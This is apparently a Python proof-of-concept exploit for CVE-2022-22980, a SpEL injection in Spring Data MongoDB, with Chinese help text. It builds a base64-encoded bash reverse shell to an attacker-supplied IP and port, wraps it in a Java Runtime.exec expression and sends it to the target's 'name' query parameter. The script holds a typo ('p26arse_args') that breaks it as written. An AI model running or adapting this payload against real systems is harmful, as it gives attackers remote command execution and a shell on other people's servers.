#!/usr/bin/env python3
# writer: yuej0nj1an

import requests
import urllib
import base64
import argparse

def poc(url,ip,prot):
    urll=f'{url}/?name='
    shell=f'/bin/bash -i >& /dev/tcp/{ip}/{prot} 0>&1'
    shell=shell.encode('utf-8')
    shell=base64.b64encode(shell)
    shell=shell.decode('utf-8')
    payload="T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('bash -c {echo,"+shell+"}|{base64,-d}|{bash,-i}')"
    print(payload)
    data = payload.encode('utf-8')
    payload = urllib.parse.quote(data)
    requests.get(url=urll+payload,verify=False)


def main():
    parser=argparse.ArgumentParser(" python CVE-2022-22980.py -u http:192.168.56.200 -i 192.168.56.200 -p 1234")
    parser.add_argument('-u','--url',dest='url',help='输入漏洞url')
    parser.add_argument('-i','--ip',dest='ip',help='输入ip')
    parser.add_argument('-p','--prot',dest='prot',help='输入反弹端口')
    args=parser.p26arse_args()

    if args.url:
        poc(args.url,args.ip,args.prot)
    else:
        print('-h 帮助')


if __name__ == '__main__':
    main()